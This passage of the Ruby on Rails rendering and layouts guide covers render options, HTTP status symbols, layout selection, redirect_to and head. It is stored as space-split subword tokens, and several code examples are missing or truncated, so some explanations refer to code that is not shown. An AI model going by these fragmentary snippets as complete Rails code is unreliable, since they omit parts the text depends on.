▁If ▁you ▁prefer , ▁you ▁can ▁use ▁a ▁symbol ▁instead ▁of ▁a ▁string ▁to ▁specify ▁the ▁action ▁to ▁render :
▁render ▁: edit
▁#### ▁Rendering ▁an ▁Action ' s ▁ Template ▁from ▁A nother ▁Controller
▁What ▁if ▁you ▁want ▁to ▁render ▁a ▁template ▁from ▁an ▁entire ly ▁different ▁controller ▁from ▁the ▁one ▁that ▁contains ▁the ▁action ▁code ?
▁You ▁can ▁also ▁do ▁that ▁with ▁` render `, ▁which ▁accept s ▁the ▁full ▁path ▁( relative ▁to ▁` app / views `) ▁of ▁the ▁template ▁to ▁render .
▁For ▁example , ▁if ▁you ' re ▁running ▁code ▁in ▁an ▁` Admin Product sController ` ▁that ▁live s ▁in ▁` app / controllers / admin `, ▁you ▁can ▁render ▁the ▁results ▁of ▁an ▁action ▁to ▁a ▁template ▁in ▁` app / views / products ` ▁this ▁way :
▁render ▁" products / show "
▁Rails ▁know s ▁that ▁this ▁view ▁belongs ▁to ▁a ▁different ▁controller ▁because ▁of ▁the ▁ embedded ▁ slash ▁character ▁in ▁the ▁string .
▁If ▁you ▁want ▁to ▁be ▁explicit , ▁you ▁can ▁use ▁the ▁`: template ` ▁option ▁( which ▁was ▁required ▁on ▁Rails ▁2 . 2 ▁and ▁earlier ) :
▁render ▁template : ▁" products / show "
▁#### ▁Rendering ▁an ▁A rb it r ary ▁File
▁render ▁file : ▁" / u / app s / w a re h ous e _ app / current / app / views / products / show "
▁The ▁`: file ` ▁option ▁take s ▁an ▁ abs ol ute ▁file - system ▁path .
▁Of ▁course , ▁you ▁need ▁to ▁have ▁right s < n > to ▁the ▁view ▁that ▁you ' re ▁using ▁to ▁render ▁the ▁content .
▁TIP : ▁If ▁you ' re ▁running ▁Rails ▁on ▁M ic r o s of t ▁Windows , ▁you ▁should ▁use ▁the ▁`: file ` ▁option ▁to < n > render ▁a ▁file , ▁because ▁Windows ▁filename s ▁do ▁not ▁have ▁the ▁same ▁format ▁as ▁Unix ▁filename s .
▁#### ▁W r app ing ▁it ▁up
▁The ▁above ▁three ▁ways ▁of ▁rendering ▁( render ing ▁another ▁template ▁within ▁the ▁controller , ▁rendering ▁a ▁template ▁within ▁another ▁controller ▁and ▁rendering ▁an ▁arbitrar y ▁file ▁on ▁the ▁file ▁system ) ▁are ▁actually ▁variant s ▁of ▁the ▁same ▁action .
▁In ▁fact , ▁in ▁the ▁ Book sController ▁class , ▁inside ▁of ▁the ▁update ▁action ▁where ▁we ▁want ▁to ▁render ▁the ▁edit ▁template ▁if ▁the ▁book ▁does ▁not ▁update ▁successfully , ▁all ▁of ▁the ▁following ▁render ▁calls ▁would ▁all ▁render ▁the ▁` edit . html . erb ` ▁template ▁in ▁the ▁` views / books ` ▁directory :
▁render ▁: edit
▁render ▁action : ▁: edit
▁render ▁" edit "
▁render ▁" edit . html . erb "
▁render ▁action : ▁" edit "
▁render ▁action : ▁" edit . html . erb "
▁render ▁" books / edit "
▁render ▁" books / edit . html . erb "
▁render ▁template : ▁" books / edit "
▁render ▁template : ▁" books / edit . html . erb "
▁render ▁" / path / to / rails / app / views / books / edit "
▁render ▁" / path / to / rails / app / views / books / edit . html . erb "
▁render ▁file : ▁" / path / to / rails / app / views / books / edit "
▁render ▁file : ▁" / path / to / rails / app / views / books / edit . html . erb "
▁Whi ch ▁one ▁you ▁use ▁is ▁really ▁a ▁matter ▁of ▁style ▁and ▁convention , ▁but ▁the ▁rule ▁of ▁thumb ▁is ▁to ▁use ▁the ▁simplest ▁one ▁that ▁make s ▁sense ▁for ▁the ▁code ▁you ▁are ▁writing .
▁#### ▁Using ▁` render ` ▁with ▁`: in line `
▁The ▁` render ` ▁method ▁can ▁do ▁without ▁a ▁view ▁completely , ▁if ▁you ' re ▁will ing ▁to ▁use ▁the ▁`: in line ` ▁option ▁to ▁supply ▁ERB ▁as ▁part ▁of ▁the ▁method ▁call .
▁This ▁is ▁ perfect ly ▁valid :
▁render ▁in line : ▁" < % ▁ products . each ▁do ▁| p | ▁%>< p > <%= ▁p . name ▁%></ p >< % ▁end ▁%> "
▁WARNING : ▁There ▁is ▁ s el do m ▁any ▁good ▁reason ▁to ▁use ▁this ▁option .
▁M i x ing ▁ERB ▁into ▁your ▁controllers ▁def e at s ▁the ▁MVC ▁or i ent ation ▁of ▁Rails ▁and ▁will ▁make ▁it ▁hard er ▁for ▁other ▁developers ▁to ▁follow ▁the ▁logic ▁of ▁your ▁project .
▁Use ▁a ▁separate ▁ erb ▁view ▁instead .
▁By ▁default , ▁in line ▁rendering ▁uses ▁ERB .
▁You ▁can ▁force ▁it ▁to ▁use ▁ Builder ▁instead ▁with ▁the ▁`: type ` ▁option :
▁render ▁in line : ▁" xml . p ▁ { ' H or r id ▁ coding ▁practice ! ' } ", ▁type : ▁: builder
▁#### ▁Rendering ▁Text
▁You ▁can ▁send ▁plain ▁text ▁- ▁with ▁no ▁markup ▁at ▁all ▁- ▁back ▁to ▁the ▁browser ▁by ▁using < n > the ▁`: plain ` ▁option ▁to ▁` render ` :
▁render ▁plain : ▁" O K "
▁TIP : ▁Rendering ▁pure ▁text ▁is ▁most ▁useful ▁when ▁you ' re ▁respond ing ▁to ▁Ajax ▁or ▁web < n > service ▁requests ▁that ▁are ▁expect ing ▁something ▁other ▁than ▁proper ▁HTML .
▁NOTE : ▁By ▁default , ▁if ▁you ▁use ▁the ▁`: plain ` ▁option , ▁the ▁text ▁is ▁rendered ▁without < n > using ▁the ▁current ▁layout .
▁#### ▁Rendering ▁HTML
▁You ▁can ▁send ▁a ▁HTML ▁string ▁back ▁to ▁the ▁browser ▁by ▁using ▁the ▁`: html ` ▁option ▁to < n >` render ` :
▁render ▁ html : ▁" < strong > N o t ▁F ound </ strong > ". html _ safe
▁TIP : ▁This ▁is ▁useful ▁when ▁you ' re ▁rendering ▁a ▁small ▁ s n ip p et ▁of ▁HTML ▁code .
▁However , ▁you ▁m ight ▁want ▁to ▁consider ▁mov ing ▁it ▁to ▁a ▁template ▁file ▁if ▁the ▁markup < n > is ▁complex .
▁#### ▁Rendering ▁JSON
▁JSON ▁is ▁a ▁JavaScript ▁data ▁format ▁used ▁by ▁many ▁Ajax ▁libraries .
▁Rails ▁has ▁built - in ▁support ▁for ▁convert ing ▁objects ▁to ▁JSON ▁and ▁rendering ▁that ▁JSON ▁back ▁to ▁the ▁browser :
▁render ▁ json : ▁@ product
▁TIP : ▁You ▁don ' t ▁need ▁to ▁call ▁` to _ json ` ▁on ▁the ▁object ▁that ▁you ▁want ▁to ▁render .
▁If ▁you ▁use ▁the ▁`: json ` ▁option , ▁` render ` ▁will ▁automatically ▁call ▁` to _ json ` ▁for ▁you .
▁#### ▁Rendering ▁ X ML
▁Rails ▁also ▁has ▁built - in ▁support ▁for ▁convert ing ▁objects ▁to ▁ X ML ▁and ▁rendering ▁that ▁ X ML ▁back ▁to ▁the ▁call er :
▁render ▁xml : ▁@ product
▁TIP : ▁You ▁don ' t ▁need ▁to ▁call ▁` to _ xml ` ▁on ▁the ▁object ▁that ▁you ▁want ▁to ▁render .
▁If ▁you ▁use ▁the ▁`: xml ` ▁option , ▁` render ` ▁will ▁automatically ▁call ▁` to _ xml ` ▁for ▁you .
▁#### ▁Rendering ▁ V a nil la ▁JavaScript
▁Rails ▁can ▁render ▁ v a nil la ▁JavaScript :
▁render ▁ js : ▁" alert (' Hello ▁Rails ') ; "
▁This ▁will ▁send ▁the ▁supplied ▁string ▁to ▁the ▁browser ▁with ▁a ▁M I ME ▁type ▁of ▁` text / javascript `.
▁#### ▁Rendering ▁raw ▁body
▁You ▁can ▁send ▁a ▁raw ▁content ▁back ▁to ▁the ▁browser , ▁without ▁setting ▁any ▁content < n > type , ▁by ▁using ▁the ▁`: body ` ▁option ▁to ▁` render ` :
▁render ▁body : ▁" raw "
▁TIP : ▁This ▁option ▁should ▁be ▁used ▁only ▁if ▁you ▁don ' t ▁care ▁about ▁the ▁content ▁type ▁of < n > the ▁response .
▁Using ▁`: plain ` ▁or ▁`: html ` ▁m ight ▁be ▁more ▁appropriate ▁in ▁most ▁of ▁the < n > time .
▁#### ▁ Options ▁for ▁` render `
▁Call s ▁to ▁the ▁` render ` ▁method ▁generally ▁accept ▁four ▁options :
▁* ▁`: content _ type `
▁* ▁`: layout `
▁* ▁`: location `
▁* ▁`: status `
▁#### # ▁The ▁`: content _ type ` ▁Option
▁By ▁default , ▁Rails ▁will ▁serve ▁the ▁results ▁of ▁a ▁rendering ▁operation ▁with ▁the ▁M I ME ▁content - type ▁of ▁` text / html ` ▁( or ▁` application / json ` ▁if ▁you ▁use ▁the ▁`: json ` ▁option , ▁or ▁` application / xml ` ▁for ▁the ▁`: xml ` ▁option . ).
▁There ▁are ▁time s ▁when ▁you ▁m ight ▁like ▁to ▁change ▁this , ▁and ▁you ▁can ▁do ▁so ▁by ▁setting ▁the ▁`: content _ type ` ▁option :
▁render ▁file : ▁filename , ▁content _ type : ▁" application / r s s "
▁#### # ▁The ▁`: layout ` ▁Option
▁With ▁most ▁of ▁the ▁options ▁to ▁` render `, ▁the ▁rendered ▁content ▁is ▁displayed ▁as ▁part ▁of ▁the ▁current ▁layout .
▁You ' ll ▁learn ▁more ▁about ▁layout s ▁and ▁how ▁to ▁use ▁them ▁later ▁in ▁this ▁guide .
▁You ▁can ▁use ▁the ▁`: layout ` ▁option ▁to ▁tell ▁Rails ▁to ▁use ▁a ▁specific ▁file ▁as ▁the ▁layout ▁for ▁the ▁current ▁action :
▁render ▁layout : ▁" special _ layout "
▁You ▁can ▁also ▁tell ▁Rails ▁to ▁render ▁with ▁no ▁layout ▁at ▁all :
▁render ▁layout : ▁false
▁#### # ▁The ▁`: location ` ▁Option
▁You ▁can ▁use ▁the ▁`: location ` ▁option ▁to ▁set ▁the ▁HTTP ▁` Location ` ▁header :
▁render ▁xml : ▁ photo , ▁location : ▁ photo _ url ( photo )
▁#### # ▁The ▁`: status ` ▁Option
▁Rails ▁will ▁automatically ▁generate ▁a ▁response ▁with ▁the ▁correct ▁HTTP ▁status ▁code ▁( in ▁most ▁cases , ▁this ▁is ▁` 200 ▁O K ` ).
▁You ▁can ▁use ▁the ▁`: status ` ▁option ▁to ▁change ▁this :
▁render ▁status : ▁50 0
▁render ▁status : ▁: for b id de n
▁Rails ▁understand s ▁both ▁ n umeric ▁status ▁code s ▁and ▁the ▁corresponding ▁symbols ▁show n ▁below .
▁| ▁ Response ▁ Class ▁| ▁HTTP ▁S t at us ▁Code ▁| ▁ Symbol ▁|
▁| ▁ --- ---------------- ▁| ▁ ---------------- ▁| ▁ ---------------- ---------------- ▁|
▁| ▁** In form ation al ** ▁| ▁100 ▁| ▁: co n t in ue ▁|
▁| ▁| ▁10 1 ▁| ▁: s w it ch ing _ proto c ol s ▁|
▁| ▁| ▁10 2 ▁| ▁: process ing ▁|
▁| ▁** S u cc es s ** ▁| ▁200 ▁| ▁: o k ▁|
▁| ▁| ▁20 1 ▁| ▁: created ▁|
▁| ▁| ▁20 2 ▁| ▁: accept ed ▁|
▁| ▁| ▁20 3 ▁| ▁: n on _ author it a tive _ information ▁|
▁| ▁| ▁20 4 ▁| ▁: no _ content ▁|
▁| ▁| ▁20 5 ▁| ▁: reset _ content ▁|
▁| ▁| ▁20 6 ▁| ▁: partial _ content ▁|
▁| ▁| ▁20 7 ▁| ▁: multi _ status ▁|
▁| ▁| ▁20 8 ▁| ▁: already _ re port ed ▁|
▁| ▁| ▁ 22 6 ▁| ▁: i m _ us ed ▁|
▁| ▁** Redirect ion ** ▁| ▁30 0 ▁| ▁: multiple _ ch o ic es ▁|
▁| ▁| ▁30 1 ▁| ▁: m o ve d _ permanent ly ▁|
▁| ▁| ▁30 2 ▁| ▁: f ound ▁|
▁| ▁| ▁30 3 ▁| ▁: see _ other ▁|
▁| ▁| ▁30 4 ▁| ▁: not _ mod if i ed ▁|
▁| ▁| ▁30 5 ▁| ▁: use _ proxy ▁|
▁| ▁| ▁30 6 ▁| ▁: re serve d ▁|
▁| ▁| ▁30 7 ▁| ▁: t e mp or ary _ redirect ▁|
▁| ▁| ▁30 8 ▁| ▁: permanent _ redirect ▁|
▁| ▁** Client ▁ Error ** ▁| ▁4 00 ▁| ▁: bad _ request ▁|
▁| ▁| ▁4 0 1 ▁| ▁: un authorize d ▁|
▁| ▁| ▁4 02 ▁| ▁: p a y ment _ require d ▁|
▁| ▁| ▁4 0 3 ▁| ▁: for b id de n ▁|
▁| ▁| ▁4 04 ▁| ▁: not _ f ound ▁|
▁| ▁| ▁4 0 5 ▁| ▁: method _ not _ allow ed ▁|
▁| ▁| ▁4 06 ▁| ▁: not _ accept able ▁|
▁| ▁| ▁4 07 ▁| ▁: proxy _ authentication _ require d ▁|
▁| ▁| ▁4 08 ▁| ▁: request _ time out ▁|
▁| ▁| ▁4 0 9 ▁| ▁: co n f li c t ▁|
▁| ▁| ▁4 10 ▁| ▁: g one ▁|
▁| ▁| ▁4 11 ▁| ▁: length _ require d ▁|
▁| ▁| ▁4 12 ▁| ▁: pre condition _ failed ▁|
▁| ▁| ▁4 1 3 ▁| ▁: request _ ent ity _ to o _ large ▁|
▁| ▁| ▁4 1 4 ▁| ▁: request _ ur i _ to o _ long ▁|
▁| ▁| ▁4 15 ▁| ▁: un support ed _ m edia _ type ▁|
▁| ▁| ▁4 16 ▁| ▁: request ed _ range _ not _ satisf i able ▁|
▁| ▁| ▁4 17 ▁| ▁: ex p ec t ation _ failed ▁|
▁| ▁| ▁42 2 ▁| ▁: un process able _ ent ity ▁|
▁| ▁| ▁4 23 ▁| ▁: lock ed ▁|
▁| ▁| ▁42 4 ▁| ▁: failed _ dependency ▁|
▁| ▁| ▁42 6 ▁| ▁: up grade _ require d ▁|
▁| ▁| ▁4 28 ▁| ▁: pre condition _ require d ▁|
▁| ▁| ▁42 9 ▁| ▁: to o _ many _ request s ▁|
▁| ▁| ▁4 3 1 ▁| ▁: request _ header _ field s _ to o _ large ▁|
▁| ▁** Server ▁ Error ** ▁| ▁50 0 ▁| ▁: internal _ server _ error ▁|
▁| ▁| ▁50 1 ▁| ▁: not _ implement ed ▁|
▁| ▁| ▁50 2 ▁| ▁: bad _ g ate way ▁|
▁| ▁| ▁50 3 ▁| ▁: service _ un available ▁|
▁| ▁| ▁50 4 ▁| ▁: g ate way _ time out ▁|
▁| ▁| ▁50 5 ▁| ▁: http _ version _ not _ support ed ▁|
▁| ▁| ▁50 6 ▁| ▁: v ar i ant _ also _ n e go t i ate s ▁|
▁| ▁| ▁50 7 ▁| ▁: in s u ff ic i ent _ st or age ▁|
▁| ▁| ▁5 08 ▁| ▁: lo o p _ de t ec t ed ▁|
▁| ▁| ▁5 10 ▁| ▁: not _ ext end ed ▁|
▁| ▁| ▁5 11 ▁| ▁: net work _ authentication _ require d ▁|
▁#### ▁Find ing ▁Layouts
▁To ▁find ▁the ▁current ▁layout , ▁Rails ▁first ▁look s ▁for ▁a ▁file ▁in ▁` app / views / layouts ` ▁with ▁the ▁same ▁base ▁name ▁as ▁the ▁controller .
▁For ▁example , ▁rendering ▁actions ▁from ▁the ▁` PhotosController ` ▁class ▁will ▁use ▁` app / views / layouts / photos . html . erb ` ▁( or ▁` app / views / layouts / photos . builder ` ).
▁If ▁there ▁is ▁no ▁such ▁controller - specific ▁layout , ▁Rails ▁will ▁use ▁` app / views / layouts / application . html . erb ` ▁or ▁` app / views / layouts / application . builder `.
▁If ▁there ▁is ▁no ▁` . erb ` ▁layout , ▁Rails ▁will ▁use ▁a ▁` . builder ` ▁layout ▁if ▁one ▁exists .
▁Rails ▁also ▁provides ▁sever al ▁ways ▁to ▁more ▁precise ly ▁assign ▁specific ▁layout s ▁to ▁individual ▁controllers ▁and ▁actions .
▁#### # ▁Specif ying ▁Layouts ▁for ▁Controller s
▁You ▁can ▁override ▁the ▁default ▁layout ▁convention s ▁in ▁your ▁controllers ▁by ▁using ▁the ▁` layout ` ▁declaration .
▁class ▁ Product sController ▁< ▁Application Controller
▁layout ▁" in ve n tory "
▁# . . .
▁With ▁this ▁declaration , ▁all ▁of ▁the ▁views ▁rendered ▁by ▁the ▁` Product sController ` ▁will ▁use ▁` app / views / layouts / in ve n tory . html . erb ` ▁as ▁their ▁layout .
▁To ▁assign ▁a ▁specific ▁layout ▁for ▁the ▁entire ▁application , ▁use ▁a ▁` layout ` ▁declaration ▁in ▁your ▁` Application Controller ` ▁class :
▁class ▁Application Controller ▁< ▁ ActionController :: Base
▁layout ▁" main "
▁With ▁this ▁declaration , ▁all ▁of ▁the ▁views ▁in ▁the ▁entire ▁application ▁will ▁use ▁` app / views / layouts / main . html . erb ` ▁for ▁their ▁layout .
▁#### # ▁Choos ing ▁Layouts ▁at ▁ Runtime
▁You ▁can ▁use ▁a ▁symbol ▁to ▁def er ▁the ▁choice ▁of ▁layout ▁un til ▁a ▁request ▁is ▁processed :
▁layout ▁: products _ layout
▁@ product ▁= ▁ Product . find ( params [: id ])
▁def ▁ products _ layout
▁@ current _ user . special ? ▁ ?
▁" special " ▁: ▁" products "
▁Now , ▁if ▁the ▁current ▁user ▁is ▁a ▁special ▁user , ▁they ' ll ▁get ▁a ▁special ▁layout ▁when ▁view ing ▁a ▁ product .
▁You ▁can ▁even ▁use ▁an ▁in line ▁method , ▁such ▁as ▁a ▁ Proc , ▁to ▁determine ▁the ▁layout .
▁For ▁example , ▁if ▁you ▁pass ▁a ▁ Proc ▁object , ▁the ▁block ▁you ▁give ▁the ▁ Proc ▁will ▁be ▁given ▁the ▁` controller ` ▁instance , ▁so ▁the ▁layout ▁can ▁be ▁determine d ▁base d ▁on ▁the ▁current ▁request :
▁#### # ▁ Conditional ▁Layouts
▁Layouts ▁specified ▁at ▁the ▁controller ▁level ▁support ▁the ▁`: only ` ▁and ▁`: except ` ▁options .
▁These ▁options ▁take ▁either ▁a ▁method ▁name , ▁or ▁an ▁array ▁of ▁method ▁names , ▁corresponding ▁to ▁method ▁names ▁within ▁the ▁controller :
▁With ▁this ▁declaration , ▁the ▁` product ` ▁layout ▁would ▁be ▁used ▁for ▁everything ▁but ▁the ▁` r s s ` ▁and ▁` index ` ▁methods .
▁#### # ▁ Layout ▁In h er it ance
▁ Layout ▁declaration s ▁cascad e ▁down w ar d ▁in ▁the ▁hierarchy , ▁and ▁more ▁specific ▁layout ▁declaration s ▁always ▁override ▁more ▁general ▁one s .
▁* ▁` application _ controller . rb `
▁layout ▁" main "
▁layout ▁" special "
▁layout ▁false
▁def ▁show
▁render ▁layout : ▁" ol d "
▁# ▁...
▁In ▁this ▁application :
▁* ▁In ▁general , ▁views ▁will ▁be ▁rendered ▁in ▁the ▁` main ` ▁layout
▁#### ▁A v o id ing ▁Do u b le ▁ Render ▁ Error s
▁So one r ▁or ▁later , ▁most ▁Rails ▁developers ▁will ▁see ▁the ▁error ▁message ▁" C an ▁only ▁render ▁or ▁redirect ▁once ▁per ▁action ".
▁Whi le ▁this ▁is ▁an no ying , ▁it ' s ▁relative ly ▁easy ▁to ▁fix .
▁U s u ally ▁it ▁happens ▁because ▁of ▁a ▁f un d a ment al ▁m is un d ers t and ing ▁of ▁the ▁way ▁that ▁` render ` ▁works .
▁For ▁example , ▁here ' s ▁some ▁code ▁that ▁will ▁trigger ▁this ▁error :
▁if ▁@ book . special ?
▁render ▁action : ▁" special _ show "
▁render ▁action : ▁" r egular _ show "
▁If ▁`@ book . special ?` ▁evaluate s ▁to ▁` true `, ▁Rails ▁will ▁start ▁the ▁rendering ▁process ▁to ▁ dump ▁the ▁`@ book ` ▁variable ▁into ▁the ▁` special _ show ` ▁view .
▁But ▁this ▁will ▁ _ not _ ▁stop ▁the ▁rest ▁of ▁the ▁code ▁in ▁the ▁` show ` ▁action ▁from ▁running , ▁and ▁when ▁Rails ▁hit s ▁the ▁end ▁of ▁the ▁action , ▁it ▁will ▁start ▁to ▁render ▁the ▁` r egular _ show ` ▁view ▁- ▁and ▁throw ▁an ▁error .
▁The ▁solution ▁is ▁simple : ▁make ▁sure ▁that ▁you ▁have ▁only ▁one ▁call ▁to ▁` render ` ▁or ▁` redirect ` ▁in ▁a ▁single ▁code ▁path .
▁One ▁thing ▁that ▁can ▁help ▁is ▁` and ▁return `.
▁Here ' s ▁a ▁ patch ed ▁version ▁of ▁the ▁method :
▁render ▁action : ▁" special _ show " ▁and ▁return
▁ Make ▁sure ▁to ▁use ▁` and ▁return ` ▁instead ▁of ▁` && ▁return ` ▁because ▁` && ▁return ` ▁will ▁not ▁work ▁due ▁to ▁the ▁operator ▁precedence ▁in ▁the ▁Ruby ▁L an g u age .
▁Note ▁that ▁the ▁ implicit ▁render ▁done ▁by ▁ ActionController ▁detect s ▁if ▁` render ` ▁has ▁been ▁called , ▁so ▁the ▁following ▁will ▁work ▁without ▁errors :
▁This ▁will ▁render ▁a ▁book ▁with ▁` special ?` ▁set ▁with ▁the ▁` special _ show ` ▁template , ▁while ▁other ▁book s ▁will ▁render ▁with ▁the ▁default ▁` show ` ▁template .
▁### ▁Using ▁` redirect _ to `
▁A nother ▁way ▁to ▁handle ▁return ing ▁response s ▁to ▁an ▁HTTP ▁request ▁is ▁with ▁` redirect _ to `.
▁As ▁you ' ve ▁seen , ▁` render ` ▁tell s ▁Rails ▁which ▁view ▁( or ▁other ▁asset ) ▁to ▁use ▁in ▁construct ing ▁a ▁response .
▁The ▁` redirect _ to ` ▁method ▁does ▁something ▁completely ▁different : ▁it ▁tell s ▁the ▁browser ▁to ▁send ▁a ▁new ▁request ▁for ▁a ▁different ▁URL .
▁For ▁example , ▁you ▁could ▁redirect ▁from ▁where ve r ▁you ▁are ▁in ▁your ▁code ▁to ▁the ▁index ▁of ▁ photos ▁in ▁your ▁application ▁with ▁this ▁call :
▁redirect _ to ▁ photos _ url
▁You ▁can ▁use ▁` redirect _ to ` ▁with ▁any ▁arguments ▁that ▁you ▁could ▁use ▁with ▁` link _ to ` ▁or ▁` url _ for `.
▁There ' s ▁also ▁a ▁special ▁redirect ▁that ▁send s ▁the ▁user ▁back ▁to ▁the ▁page ▁they ▁just ▁ ca me ▁from :
▁redirect _ to ▁: back
▁#### ▁ Getting ▁a ▁D if f er ent ▁ Redirect ▁S t at us ▁Code
▁Rails ▁uses ▁HTTP ▁status ▁code ▁30 2 , ▁a ▁temporary ▁redirect , ▁when ▁you ▁call ▁` redirect _ to `.
▁If ▁you ' d ▁like ▁to ▁use ▁a ▁different ▁status ▁code , ▁p erhaps ▁30 1, ▁a ▁ permanent ▁redirect , ▁you ▁can ▁use ▁the ▁`: status ` ▁option :
▁redirect _ to ▁ photos _ path , ▁status : ▁30 1
▁Ju st ▁like ▁the ▁`: status ` ▁option ▁for ▁` render `, ▁`: status ` ▁for ▁` redirect _ to ` ▁accept s ▁both ▁ n umeric ▁and ▁symbol ic ▁header ▁design ation s .
▁#### ▁The ▁D if f er ence ▁Be t we en ▁` render ` ▁and ▁` redirect _ to `
▁Sometimes ▁in ex p er i ence d ▁developers ▁think ▁of ▁` redirect _ to ` ▁as ▁a ▁sort ▁of ▁` go to ` ▁command , ▁mov ing ▁execut ion ▁from ▁one ▁place ▁to ▁another ▁in ▁your ▁Rails ▁code .
▁This ▁is ▁ _ not _ ▁correct .
▁Your ▁code ▁stop s ▁running ▁and ▁wait s ▁for ▁a ▁new ▁request ▁for ▁the ▁browser .
▁It ▁just ▁happens ▁that ▁you ' ve ▁to l d ▁the ▁browser ▁what ▁request ▁it ▁should ▁make ▁next , ▁by ▁sending ▁back ▁an ▁HTTP ▁30 2 ▁status ▁code .
▁Consider ▁these ▁actions ▁to ▁see ▁the ▁difference :
▁@ book ▁= ▁ Book . find _ by ( id : ▁params [: id ])
▁if ▁@ book . nil ?
▁render ▁action : ▁" index "
▁With ▁the ▁code ▁in ▁this ▁form , ▁there ▁will ▁likely ▁be ▁a ▁problem ▁if ▁the ▁`@ book ` ▁variable ▁is ▁` nil `.
▁Re member , ▁a ▁` render ▁: action ` ▁does n ' t ▁run ▁any ▁code ▁in ▁the ▁target ▁action , ▁so ▁nothing ▁will ▁set ▁up ▁the ▁`@ books ` ▁variable ▁that ▁the ▁` index ` ▁view ▁will ▁ probably ▁require .
▁One ▁way ▁to ▁fix ▁this ▁is ▁to ▁redirect ▁instead ▁of ▁rendering :
▁redirect _ to ▁action : ▁: index
▁With ▁this ▁code , ▁the ▁browser ▁will ▁make ▁a ▁fresh ▁request ▁for ▁the ▁index ▁page , ▁the ▁code ▁in ▁the ▁` index ` ▁method ▁will ▁run , ▁and ▁all ▁will ▁be ▁well .
▁The ▁only ▁down side ▁to ▁this ▁code ▁is ▁that ▁it ▁requires ▁a ▁ r ound ▁tr ip ▁to ▁the ▁browser : ▁the ▁browser ▁request ed ▁the ▁show ▁action ▁with ▁` / books /1 ` ▁and ▁the ▁controller ▁find s ▁that ▁there ▁are ▁no ▁book s , ▁so ▁the ▁controller ▁send s ▁out ▁a ▁30 2 ▁redirect ▁response ▁to ▁the ▁browser ▁tell ing ▁it ▁to ▁go ▁to ▁` / books / `, ▁the ▁browser ▁com p li es ▁and ▁send s ▁a ▁new ▁request ▁back ▁to ▁the ▁controller ▁as k ing ▁now ▁for ▁the ▁` index ` ▁action , ▁the ▁controller ▁the n ▁get s ▁all ▁the ▁book s ▁in ▁the ▁database ▁and ▁render s ▁the ▁index ▁template , ▁sending ▁it ▁back ▁down ▁to ▁the ▁browser ▁which ▁the n ▁shows ▁it ▁on ▁your ▁screen .
▁Whi le ▁in ▁a ▁small ▁application , ▁this ▁added ▁late n c y ▁m ight ▁not ▁be ▁a ▁problem , ▁it ▁is ▁something ▁to ▁think ▁about ▁if ▁response ▁time ▁is ▁a ▁concern .
▁We ▁can ▁demonstrate ▁one ▁way ▁to ▁handle ▁this ▁with ▁a ▁con tr ive d ▁example :
▁flash . now [: alert ] ▁= ▁" You r ▁book ▁was ▁not ▁found "
▁render ▁" index "
▁This ▁would ▁detect ▁that ▁there ▁are ▁no ▁book s ▁with ▁the ▁specified ▁ ID , ▁ populate ▁the ▁`@ books ` ▁instance ▁variable ▁with ▁all ▁the ▁book s ▁in ▁the ▁model , ▁and ▁the n ▁directly ▁render ▁the ▁` index . html . erb ` ▁template , ▁return ing ▁it ▁to ▁the ▁browser ▁with ▁a ▁flash ▁ alert ▁message ▁to ▁tell ▁the ▁user ▁what ▁happen ed .
▁### ▁Using ▁` head ` ▁To ▁B u il d ▁Header - O n ly ▁ Response s
▁The ▁` head ` ▁method ▁can ▁be ▁used ▁to ▁send ▁response s ▁with ▁only ▁headers ▁to ▁the ▁browser .
▁It ▁provides ▁a ▁more ▁obvious ▁ alternative ▁to ▁calling ▁` render ▁: not h ing `.
▁The ▁` head ` ▁method ▁accept s ▁a ▁number ▁or ▁symbol ▁( see ▁[ reference ▁table ](# the - status - option ) ) ▁represent ing ▁a ▁HTTP ▁status ▁code .
▁The ▁options ▁argument ▁is ▁interpret ed ▁as ▁a ▁hash ▁of ▁header ▁names ▁and ▁values .
▁For ▁example , ▁you ▁can ▁return ▁only ▁an ▁error ▁header :
▁ head ▁: bad _ request
▁This ▁would ▁produce ▁the ▁following ▁header :
▁HTTP /1.1 ▁4 00 ▁B ad ▁ Request
▁Date : ▁Sun , ▁24 ▁Jan ▁2010 ▁ 12 : 15 : 5 3 ▁GMT
▁ Content - Type : ▁text / html ; ▁ cha r set = u t f -8
▁ X - Runtime : ▁0.0 1 34 8 3
▁Or ▁you ▁can ▁use ▁other ▁HTTP ▁headers ▁to ▁con ve y ▁other ▁information :
▁ head ▁: created , ▁location : ▁ photo _ path (@ photo )
▁Whi ch ▁would ▁produce :
▁HTTP /1.1 ▁20 1 ▁Create d
▁Date : ▁Sun , ▁24 ▁Jan ▁2010 ▁ 12 : 16 : 44 ▁GMT
▁ Location : ▁/ photos /1
▁ X - Runtime : ▁0.0 8 34 9 6
▁S t ru c t ur ing ▁Layouts
▁When ▁Rails ▁render s ▁a ▁view ▁as ▁a ▁response , ▁it ▁does ▁so ▁by ▁com bin ing ▁the ▁view ▁with ▁the ▁current ▁layout , ▁using ▁the ▁rules ▁for ▁find ing ▁the ▁current ▁layout ▁that ▁were ▁covered ▁earlier ▁in ▁this ▁guide .
▁With in ▁a ▁layout , ▁you ▁have ▁access ▁to ▁three ▁tool s ▁for ▁com bin ing ▁different ▁bit s ▁of ▁output ▁to ▁form ▁the ▁over all ▁response :
▁### ▁ Asset ▁T a g ▁ Helpers
▁ Asset ▁tag ▁helpers ▁provide ▁methods ▁for ▁ generating ▁HTML ▁that ▁link ▁views ▁to ▁feed s , ▁JavaScript , ▁stylesheets , ▁images , ▁video s ▁and ▁ audio s .
▁There ▁are ▁ s i x ▁asset ▁tag ▁helpers ▁available ▁in ▁Rails :
▁You ▁can ▁use ▁these ▁tags ▁in ▁layout s ▁or ▁other ▁views , ▁although ▁the ▁` auto _ discover y _ link _ tag `, ▁` javascript _ include _ tag `, ▁and ▁` stylesheet _ link _ tag `, ▁are ▁most ▁commonly ▁used ▁in ▁the ▁` < head >` ▁section ▁of ▁a ▁layout .
▁WARNING : ▁The ▁asset ▁tag ▁helpers ▁do ▁ _ not _ ▁verify ▁the ▁exist ence ▁of ▁the ▁assets ▁at ▁the ▁specified ▁location s ; ▁they ▁simply ▁assume ▁that ▁you ▁know ▁what ▁you ' re ▁doing ▁and ▁generate ▁the ▁link .
▁#### ▁Link ing ▁to ▁F e ed s ▁with ▁the ▁` auto _ discover y _ link _ tag `
▁The ▁` auto _ discover y _ link _ tag ` ▁helper ▁build s ▁HTML ▁that ▁most ▁browsers ▁and ▁feed ▁readers ▁can ▁use ▁to ▁detect ▁the ▁presence ▁of ▁R SS ▁or ▁A to m ▁feed s .
